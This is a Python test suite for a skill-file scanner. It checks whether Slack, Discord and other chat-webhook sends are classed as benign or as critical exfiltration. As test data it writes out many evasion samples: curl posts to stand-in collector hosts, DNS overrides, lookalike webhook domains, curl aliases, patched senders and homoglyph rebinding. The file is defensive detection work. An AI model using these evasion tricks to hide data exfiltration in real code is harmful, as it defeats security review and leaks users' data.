"""Batch 7b part 1: a Slack or Discord webhook URL is the medium ISR-T018 only when the whole document passes a simple allowlist
(one plain string literal passed straight to requests/httpx/axios .post/.put/.patch/.get, or the single URL of a plain curl/wget
line with allowlisted options, and no doubt construct anywhere in the document's code); otherwise it is the critical ISR-T005.
D1: hosts ISR-T005's pattern doesn't cover (Teams, Google Chat, Telegram, Slack workflows) keep ISR-T018 when the URL's own host and
path are the service's. D2: any character that isn't ASCII in the document's code is doubt.

Part 2 adds Replays: PR3's Codex round 3 highs 1-7, each ISR-T018 on a3e535e. Fix round 1 adds CodexRound1 (imports, HTML code
regions, statement starts, shell line joins, shell words and loops, repeated sends, a long import line), each failing on a34e390.
Fix round 2 adds CodexRound2 (blanks before an import line's comment, many shell line joins: each times out on 18c3c56; and both
new readings checked against fix round 1's regexes).
Every URL is an example; every webhook is FAKE; `relay` is a placeholder that is never run."""
import os, subprocess, sys, unittest
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from test_boxes import ROOT, user_copy
import isr  # noqa: E402
from test_batch4_codex_review3 import Folder, HEAD, HOOK, vet_json
from test_batch5_codex_r2 import rules_of, fenced

SLACK = "https://hooks.slack.com/services/T0/B0/FAKE"
FIX = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures")


class StayChatWebhooks(unittest.TestCase):
    CODE = (("python", "requests.post('" + HOOK + "', json=payload)"),
            ("python", "requests.post('" + HOOK + "')"),
            ("python", "resp = requests.post(\"" + HOOK + "\", json=payload, timeout=10)"),
            ("python", "requests.put('" + HOOK + "', data=body, headers=headers)"),
            ("python", "requests.patch('" + HOOK + "', json=payload)"),
            ("python", "requests.get('" + HOOK + "', params)"),
            ("python", "httpx.post('" + HOOK + "', json=payload)"),
            ("python", "import requests\nrequests.post('" + HOOK + "', json=payload)"),
            ("python", "import requests, json\nfrom datetime import date\nrequests.post('" + HOOK + "', json={'day': str(date.today())})"),
            ("python", "if ready:\n    requests.post('" + SLACK + "', json=payload)  # notify the team"),
            ("js", "axios.post('" + HOOK + "', body)"),
            ("js", "axios.get('" + HOOK + "')"),
            ("js", "const axios = require('axios');\naxios.post('" + HOOK + "', {content: 'done'});"),
            ("javascript", "import axios from 'axios'\nawait axios.post('" + HOOK + "', body)"),
            ("js", "const r = await axios.post('" + HOOK + "', body)"))
    SHELL = (("bash", "curl -X POST -H 'Content-Type: application/json' -d '{\"text\":\"done\"}' '" + SLACK + "'"),
             ("console", "$ curl -sS -d @d.json " + SLACK),
             ("zsh", "curl --fail --silent --show-error -d @d.json \"" + SLACK + "\""),
             ("sh", "curl -XPOST --data-binary @d.json \\\n  '" + SLACK + "'"),
             # batch 7d (C2): `curl -s -d @d.json '<SLACK>' > out.txt` moved to BecomeT005.SHELL (any redirection is doubt)
             ("bash", "curl -d @d.json '" + SLACK + "' # notify the team"),
             ("bash", "curl -d @d.json '" + SLACK + "' && echo sent"),
             ("", "curl --json @d.json --max-time 10 '" + SLACK + "'"),
             ("bash", "wget -qO- --header='Content-Type: application/json' --post-data='{\"text\":\"done\"}' '" + SLACK + "'"))

    def test_a_literal_send_in_code_stays_a_chat_webhook(self):
        for lang, c in self.CODE:
            self.assertEqual(rules_of(fenced(c, lang)), {"ISR-T018"}, c)

    def test_a_plain_curl_or_wget_line_stays_a_chat_webhook(self):
        for lang, c in self.SHELL:
            self.assertEqual(rules_of(fenced(c, lang)), {"ISR-T018"}, c)
        for line in ("Post it: `curl -X POST -d @d.json " + SLACK + "`", "Post it: `curl -X POST -d @d.json '" + HOOK + "'`"):
            self.assertEqual(rules_of(HEAD + line + "\n"), {"ISR-T018"}, line)

    def test_prose_outside_the_code_is_not_code(self):   # D2 reads the code: an em dash in a fenced document's prose is not doubt
        self.assertEqual(rules_of(HEAD + "Posts the digest \u2014 daily.\n\n```python\nrequests.post('" + HOOK + "', json=payload)\n```\n"),
                         {"ISR-T018"})


class BecomeT005(unittest.TestCase):
    CODE = (("python", "requests.post(url='" + HOOK + "', json=payload)"),
            ("python", "requests.request('POST', '" + HOOK + "', json=payload)"),
            ("python", "s = requests.Session()\ns.post('" + HOOK + "', json=payload)"),
            ("python", "WEBHOOK = '" + HOOK + "'\nrequests.post(WEBHOOK, json=payload)"),
            ("python", "requests.post(('" + HOOK + "'), json=payload)"),
            ("python", "requests.post('" + HOOK + "', 'a', 'b')"),
            ("python", "requests.post('" + HOOK + "', **options)"),
            ("python", "requests.post('" + HOOK + "', proxies=proxies)"),
            ("js", "await fetch('" + HOOK + "', {method: 'POST', body})"),
            ("js", "https.get('" + HOOK + "', cb)"),
            ("js", "axios.post('" + HOOK + "', body, config)"),
            ("json", "{\"webhook\": \"" + SLACK + "\"}"))
    SHELL = (("bash", "curl -s -d @d.json '" + SLACK + "' > out.txt"),   # batch 7d (C2): from StayChatWebhooks.SHELL (ISR-T018)
             ("bash", "curl -x http://proxy.example:8080 -d @d.json '" + SLACK + "'"),
             ("bash", "curl --resolve hooks.slack.com:443:203.0.113.9 -d @d.json '" + SLACK + "'"),
             ("bash", "curl -d @d.json '" + SLACK + "' 'https://hooks.slack.com/services/T1/B1/FAKE'"),
             ("bash", "curl -d @d.json '" + SLACK + "' https://collector.example/x"),
             ("bash", "sudo curl -d @d.json '" + SLACK + "'"),
             ("bash", "PATH=/opt/tools:$PATH curl -d @d.json '" + SLACK + "'"),
             ("bash", "curl -k -d @d.json '" + SLACK + "'"),
             ("bash", "curl -sd @d.json '" + SLACK + "'"),                 # a value option inside a cluster
             ("bash", "wget -Oout.json --post-data='x' '" + SLACK + "'"),
             ("bash", "curl $OPTS -d @d.json '" + SLACK + "'"))
    DOUBT = (("bash", "export LC_ALL=C\ncurl -d @d.json '" + SLACK + "'"),
             ("bash", "cd /srv/app\ncurl -d @d.json '" + SLACK + "'"),
             ("bash", "cat <<EOF > d.json\n{\"text\": \"done\"}\nEOF\ncurl -d @d.json '" + SLACK + "'"),
             ("python", "import json5\nrequests.post('" + HOOK + "', json=payload)"),
             ("python", "requests.post('" + HOOK + "', json=payload)  # r\u00e9sum\u00e9"),
             ("python", "requests.post('" + HOOK + "', json={'text': 'Build done \u2705'})"))

    def test_the_plain_forms_are_critical(self):
        for lang, c in self.CODE + self.SHELL + self.DOUBT:
            self.assertEqual(rules_of(fenced(c, lang)), {"ISR-T005"}, c)

    def test_a_link_or_prose_is_critical(self):
        for line in ("Docs: [our hook](" + SLACK + ")", "Set the webhook to \"" + SLACK + "\" in the settings.",
                     "Post the summary to " + SLACK + " when done."):
            self.assertEqual(rules_of(HEAD + line + "\n"), {"ISR-T005"}, line)

    def test_a_quoted_url_in_prose_next_to_a_fence_is_critical(self):
        self.assertEqual(rules_of(HEAD + "Send to requests.post('" + HOOK + "').\n\n```python\nprint('ok')\n```\n"), {"ISR-T005"})

    def test_a_non_ascii_character_anywhere_in_a_fenceless_text_is_doubt(self):   # D2: the whole text is the code
        self.assertEqual(rules_of(HEAD + "Posts the digest \u2014 daily: `curl -X POST -d @d.json " + SLACK + "`\n"), {"ISR-T005"})


class OtherChatHosts(unittest.TestCase):   # D1
    HOSTS = ("https://example.webhook.office.com/webhookb2/FAKE", "https://outlook.office.com/webhook/FAKE",
             "https://chat.googleapis.com/v1/spaces/AAAA/messages?key=FAKE", "https://api.telegram.org/botFAKE/sendMessage",
             "https://hooks.slack.com/workflows/T0/A0/FAKE", "https://hooks.slack.com/triggers/T0/1/FAKE")

    def test_hosts_t005_does_not_cover_stay_chat_webhooks_in_any_form(self):
        for url in self.HOSTS:
            for text in (fenced("requests.post('" + url + "', json=payload)"), fenced("url = '" + url + "'"),
                         HEAD + "Post the summary to " + url + " when done.\n",
                         fenced("exec(code)\nrequests.post(url='" + url + "')")):
                self.assertEqual(rules_of(text), {"ISR-T018"}, text)

    def test_their_lookalikes_are_not_chat_webhooks(self):
        for url in ("https://collector.example/x.webhook.office.com/FAKE", "https://user@chat.googleapis.com/v1/spaces/A/messages",
                    "https://api.telegram.org:8443/botFAKE/sendMessage"):
            self.assertNotIn("ISR-T018", rules_of(fenced("requests.post('" + url + "', json=payload)")), url)


class LookalikeHosts(unittest.TestCase):
    def test_a_lookalike_slack_or_discord_url_stays_critical(self):
        for url in ("https://user@hooks.slack.com/services/T0/B0/FAKE",
                    "https://collector.example/hooks.slack.com/services/T0/B0/FAKE", "https://evil-discord.com/api/webhooks/1/FAKE",
                    "https://collector.example/discord.com/api/webhooks/1/FAKE"):
            for text in (fenced("requests.post('" + url + "', json=payload)"), fenced("curl -d @d.json '" + url + "'", "bash")):
                self.assertEqual(rules_of(text), {"ISR-T005"}, text)
        # a port in front of the path: neither rule's pattern matches it (as before); it is never ISR-T018
        for text in (fenced("requests.post('https://hooks.slack.com:8443/services/T0/B0/FAKE', json=payload)"),
                     fenced("curl -d @d.json 'https://hooks.slack.com:8443/services/T0/B0/FAKE'", "bash")):
            self.assertNotIn("ISR-T018", rules_of(text), text)


class Replays(unittest.TestCase):   # PR3's Codex round 3 highs 1-7 (must-fix in docs/KNOWN-LIMITS.md until part 2); each ISR-T018 on a3e535e
    def test_1_a_sender_rebound_after_a_floor_division(self):
        self.assertEqual(rules_of(fenced("x = 1 // 1; (send) = relay\nsend('" + HOOK + "')")), {"ISR-T005"})

    def test_2_dict_rebound_inside_an_f_string(self):
        self.assertEqual(rules_of(fenced("f'{(ｄict := relay)}'\nconfig = dict()\n"
                                         "requests.post(config.get('hook', '" + HOOK + "'), json=payload)")), {"ISR-T005"})

    def test_3_an_imported_module_as_the_sender(self):
        self.assertEqual(rules_of(fenced("import helpers\nhelpers.send('" + HOOK + "', payload)")), {"ISR-T005"})

    def test_4_a_patched_sender(self):
        self.assertEqual(rules_of(fenced("requests.post.__code__ = relay.__code__\nrequests.post('" + HOOK + "', json=payload)")),
                         {"ISR-T005"})

    def test_5_the_destination_reassigned_in_another_block(self):
        self.assertEqual(rules_of(fenced("hook = '" + HOOK + "'") + "\n" + "```python\nhook = os.environ['OTHER_URL']\n"
                                  "requests.post(hook, json=payload)\n```\n"), {"ISR-T005"})

    def test_6_a_quoted_shell_alias(self):
        self.assertEqual(rules_of(fenced("alias \"curl=relay\"\ncurl -d @d.json '" + HOOK + "'", "bash")), {"ISR-T005"})

    def test_7_a_search_path_change_through_an_import_alias(self):
        self.assertEqual(rules_of(fenced("from sys import path\npath.insert(0, 'vendor')\nrequests.post('" + HOOK + "', json=payload)")),
                         {"ISR-T005"})


class CodexRound1(unittest.TestCase):   # fix round 1: each ISR-T018 on a34e390 (6 and 7 are scaling checks, in LinearTime's way)
    def test_1a_an_import_line_that_also_rebinds_the_client(self):
        self.assertEqual(rules_of(fenced("from os import path; requests = relay\nrequests.post('" + HOOK + "', json=payload)")),
                         {"ISR-T005"})

    def test_1b_an_import_alias_that_binds_the_client_name(self):
        self.assertEqual(rules_of(fenced("from json import loads as requests\nrequests.post('" + HOOK + "', json=payload)")),
                         {"ISR-T005"})

    def test_1c_names_imported_out_of_the_client_module(self):
        self.assertEqual(rules_of(fenced("from requests import api\nrequests.post('" + HOOK + "', json=payload)")), {"ISR-T005"})

    def test_2a_an_upper_case_pre_block(self):
        self.assertEqual(rules_of(HEAD + "<PRE>\nalias curl=relay\n</PRE>\n\n" + "```bash\ncurl -d @d.json '" + SLACK + "'\n```\n"),
                         {"ISR-T005"})

    def test_2b_a_pre_block_across_a_blank_line(self):
        self.assertEqual(rules_of(HEAD + "<pre>\nnotes\n\nalias curl=relay\n</pre>\n\n" + "```bash\ncurl -d @d.json '" + SLACK
                                  + "'\n```\n"), {"ISR-T005"})

    def test_3a_the_client_after_an_attribute_dot_inside_brackets(self):
        self.assertEqual(rules_of(fenced("(relay.\n requests.post('" + HOOK + "', json=payload))")), {"ISR-T005"})

    def test_3b_the_client_after_an_attribute_dot_in_js(self):
        self.assertEqual(rules_of(fenced("relay.\naxios.post('" + HOOK + "', body)", "js")), {"ISR-T005"})

    def test_4a_a_deny_builtin_split_by_a_line_join(self):
        self.assertEqual(rules_of(fenced("al\\\nias curl=relay\ncurl -d @d.json '" + SLACK + "'", "bash")), {"ISR-T005"})

    def test_4b_cd_split_by_a_line_join(self):
        self.assertEqual(rules_of(fenced("c\\\nd relay\ncurl -d @d.json '" + SLACK + "'", "bash")), {"ISR-T005"})

    def test_5a_a_command_substitution_in_an_option_value(self):
        self.assertEqual(rules_of(fenced("curl -H \"X-Note: $(relay)\" -d @d.json '" + SLACK + "'", "bash")), {"ISR-T005"})

    def test_5b_a_glob_in_an_option_value(self):
        self.assertEqual(rules_of(fenced("curl -d @*.json '" + SLACK + "'", "bash")), {"ISR-T005"})

    def test_5c_a_send_inside_a_shell_loop(self):
        self.assertEqual(rules_of(fenced("for f in a b\ndo\ncurl -d @d.json '" + SLACK + "'\ndone", "bash")), {"ISR-T005"})

    def test_5d_a_send_inside_a_shell_conditional(self):
        self.assertEqual(rules_of(fenced("if relay\nthen\ncurl -d @d.json '" + SLACK + "'\nfi", "bash")), {"ISR-T005"})

    def test_6_repeated_python_and_axios_sends_scale_linearly(self):
        for lang, send in (("python", "\"requests.post('\" + HOOK + \"', json=payload)\\n\""), ("js", "\"axios.post('\" + HOOK + \"', body)\\n\"")):
            build = lambda n: "HEAD + '```" + lang + "\\n' + (" + send + ") * " + str(n) + " + '```\\n'"
            got, _, small = _run(build(250))
            self.assertEqual(got, "['ISR-T018']")
            got, scan, big = _run(build(2_000))
            self.assertEqual(got, "['ISR-T018']")
            self.assertLess(scan, 20.0)
            self.assertLess(big, 24 * small + 0.1, lang)   # linear is 8x; a34e390 was quadratic

    def test_7_a_long_import_line_is_read_once(self):
        got, scan, chat = _run("HEAD + '```python\\nfrom os import path # ' + 'import ' * 100_000 + \"\\nrequests.post('\" + HOOK"
                               " + \"', json=payload)\\n```\\n\"", timeout=30)
        self.assertEqual(got, "['ISR-T005']")
        self.assertLess(scan + chat, 20.0)   # chat_webhook runs first and does the reading (a34e390: 23.7 s there)


class CodexRound2(unittest.TestCase):   # fix round 2: 1 and 2 time out on 18c3c56 at full size; the small size gives today's result
    def test_1_blanks_before_an_import_line_comment_scale_linearly(self):
        build = lambda n: ("HEAD + '```js\\nimport axios from \\'axios\\'' + ' ' * " + str(n) + " + \"/* note */\\naxios.post('\" + HOOK"
                           " + \"', body)\\n```\\n\"")
        self.assertEqual(_run(build(2_000))[0], "['ISR-T005']")
        self.assertEqual(_run(build(200_000), timeout=20)[0], "['ISR-T005']")

    def test_2_many_shell_line_joins_before_a_curl_scale_linearly(self):
        build = lambda n: "HEAD + '```bash\\n' + '\\\\\\n' * " + str(n) + " + \"true\\ncurl -d @d.json '\" + SLACK + \"'\\n```\\n\""
        self.assertEqual(_run(build(1_000))[0], "['ISR-T018']")
        self.assertEqual(_run(build(32_000), timeout=20)[0], "['ISR-T018']")

    def test_3_both_readings_agree_with_fix_round_1(self):   # the round-1 regexes, rebuilt here, on a fixed corpus
        import random, re
        old_imports = re.compile(
            r"(?:import[ \t]+" + isr._ALLOWED_MODS + r"(?:[ \t]*,[ \t]*" + isr._ALLOWED_MODS + r")*"
            r"|from[ \t]+" + isr._FROM_MODS + r"[ \t]+import[ \t]+" + isr._IMPORTED + r"(?:[ \t]*,[ \t]*" + isr._IMPORTED
            + r")*)(?P<pc>[ \t]+#.*)?"
            r"|(?:import[ \t]+axios[ \t]+from[ \t]+(?P<q1>['\"])axios(?P=q1)"
            r"|(?:const|let|var)[ \t]+axios[ \t]*=[ \t]*require\([ \t]*(?P<q2>['\"])axios(?P=q2)[ \t]*\))[ \t]*;?(?P<jc>[ \t]*//.*)?")
        old_ctrl = re.compile(r"(?m)(?:^|(?<=[;&|(){}`\n]))(?:[ \t!]|\\\r?\n)*(?:"
                              + "|".join(r"(?:\\\r?\n)*".join(w) for w in ("if", "for", "while", "until", "case", "select", "function"))
                              + r")(?![\w-])")
        rnd = random.Random(7)
        heads = ["import json", "import json , os", "from os import path", "from time import a,b", "import axios from 'axios'",
                 "const axios = require( \"axios\" )", "let axios=require('axios')", "import axios", "from requests import x",
                 "import jsonx", "from os import as", "import os,", " import os ", ""]
        tails = ["", " ", "\t", ";", " ;", "; ", ";;", "  # c", "# c", " #import x", "// c", " // c", " ;// c", "; // require",
                 " /* c */", " ; ; //", ",", " ,os", "\r", " #", "\x0c", " é"]
        pieces = ["import", "from", "axios", "json", "os", "as", "require(", ")", "'axios'", " ", "\t", ",", ";", "#", "//", "x", "="]
        lines = [h + t for h in heads for t in tails] + ["".join(rnd.choice(pieces) for _ in range(rnd.randint(1, 8)))
                                                         for _ in range(3_000)]
        for line in lines:
            m = old_imports.fullmatch(line.strip())
            old = bool(m) and not isr._IMPORT_WORD.search(m.group("pc") or m.group("jc") or "")
            self.assertEqual(isr._import_line(line, 0, len(line)), old, repr(line))
        pieces = ["if", "i", "f", "for", "fi", "while", "function", "case", "select", "until", "do", " ", "\t", "!", "\\\n",
                  "\\\r\n", "\\", "\n", "\r", ";", "&", "|", "(", ")", "{", "}", "`", "x", "-"]
        for _ in range(5_000):
            t = "".join(rnd.choice(pieces) for _ in range(rnd.randint(0, 12)))
            rs = rnd.randint(0, len(t))
            re_ = rnd.randint(rs, len(t))
            m = old_ctrl.search(t, rs, re_)
            self.assertEqual(isr._shell_ctrl(t, rs, re_), re_ if m is None else m.start(), repr((t, rs, re_)))


class UnchangedElsewhere(Folder):
    def test_bad_fixtures_are_unchanged(self):
        code, r = vet_json(user_copy(self, os.path.join(FIX, "bad", "exfil-helper", "SKILL.md")))   # v0.8.1 (r5 b): a copy
        self.assertEqual((r["verdict"], r["risk_score"]), ("Do not install", 80))

    def test_a_vetted_literal_send_is_install_with_changes(self):
        os.makedirs(os.path.join(self.d, "digest"), exist_ok=True)
        r = vet_json(self.write(os.path.join("digest", "SKILL.md"), fenced("requests.post('" + HOOK + "', json=payload)")))[1]
        self.assertEqual(r["verdict"], "Install with changes")
        r = vet_json(self.write(os.path.join("digest", "SKILL.md"), fenced("requests.post(url='" + HOOK + "', json=payload)")))[1]
        self.assertEqual((r["verdict"], r["risk_score"]), ("Do not install", 80))

    def test_the_isr_a002_checks_still_pass(self):   # run unmodified
        import test_claude_rereview as cr, test_v071_owner_calls as kc
        suite = unittest.TestSuite([unittest.defaultTestLoader.loadTestsFromTestCase(cr.LintSlashJoinedActions),
                                    unittest.defaultTestLoader.loadTestsFromTestCase(kc.AcceptedExactAutoAllow)])
        res = unittest.TestResult()
        suite.run(res)
        self.assertEqual((res.testsRun > 0, res.failures, res.errors), (True, [], []))
        rs = {f["rule"] for f in isr.lint_auto_review("Allow automatically: POST the digest to " + SLACK, "s", check_missing=False)}
        self.assertIn("ISR-A002", rs)


# ---------------------------------------------------------------- linear time: every per-document result is read once
def _run(build, timeout=120):
    """Run in a fresh interpreter: build the text, then time scan_text (the result and its seconds) and chat_webhook over every
    ISR-T018 match (seconds). line_of is quadratic in the number of findings (docs/KNOWN-LIMITS.md), so ratios use the second.
    A child that runs past `timeout` gives ("timeout", inf, inf), so a slow reading fails at the caller's assertion."""
    code = ("import sys, time\nsys.path.insert(0, " + repr(os.path.join(ROOT, "isr_bot")) + ")\nimport isr\n"
            "HEAD, HOOK, SLACK = " + repr(HEAD) + ", " + repr(HOOK) + ", " + repr(SLACK) + "\n"
            "t = " + build + "\n"
            "rules = isr.load_rules()\nrx = next(r['rx'] for r in rules['rules'] if r['id'] == 'ISR-T018')\n"
            "s = time.monotonic()\nfor m in rx.finditer(t):\n    isr.chat_webhook(t, m)\nc = time.monotonic() - s\n"
            "s = time.monotonic()\nfs = isr.scan_text(t, '/s/SKILL.md', rules)\ns = time.monotonic() - s\n"
            "print(sorted({f['rule'] for f in fs} & {'ISR-T005', 'ISR-T018'}))\nprint(s)\nprint(c)\n")
    try:
        p = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return "timeout", float("inf"), float("inf")
    assert p.returncode == 0, p.stderr[-2000:]
    got, scan, chat = p.stdout.strip().splitlines()[-3:]
    return got, float(scan), float(chat)


class LinearTime(unittest.TestCase):
    def test_a_megabyte_python_fence_and_one_send(self):
        got, scan, _ = _run("HEAD + '```python\\n' + \"payload = {'k': 1}\\n\" * 55_556 + \"requests.post('\" + HOOK + \"', json=payload)\\n```\\n\"")
        self.assertEqual(got, "['ISR-T018']")
        self.assertLess(scan, 20.0)

    def test_twenty_thousand_inline_curl_lines(self):
        line = "'Post it: `curl -X POST -d @d.json ' + SLACK + '`\\n'"
        got, scan, small = _run("HEAD + " + line + " * 2_500")
        self.assertEqual(got, "['ISR-T018']")
        got, scan, big = _run("HEAD + " + line + " * 20_000")
        self.assertEqual(got, "['ISR-T018']")
        self.assertLess(scan, 20.0)
        self.assertLess(big, 16 * small + 0.05)

    def test_a_megabyte_line_of_imports(self):
        got, scan, _ = _run("HEAD + '```python\\n' + 'import x;' * 111_112 + \"\\nrequests.post('\" + HOOK + \"', json=payload)\\n```\\n\"")
        self.assertEqual(got, "['ISR-T005']")
        self.assertLess(scan, 20.0)

    def test_a_megabyte_bash_fence_of_glued_quotes(self):
        got, scan, _ = _run("HEAD + '```bash\\n' + ('\"a\"\"b\" \\'c\\' ' * 10 + '\\n') * 9_524 + \"curl -d @d.json '\" + SLACK + \"'\\n```\\n\"")
        self.assertEqual(got, "['ISR-T018']")
        self.assertLess(scan, 20.0)

    def test_one_curl_with_five_thousand_urls(self):
        got, scan, _ = _run("HEAD + '```bash\\ncurl -d @d.json ' + ' '.join(\"'\" + SLACK + str(i) + \"'\" for i in range(5_000)) + '\\n```\\n'")
        self.assertEqual(got, "['ISR-T005']")
        self.assertLess(scan, 20.0)


if __name__ == "__main__":
    unittest.main()
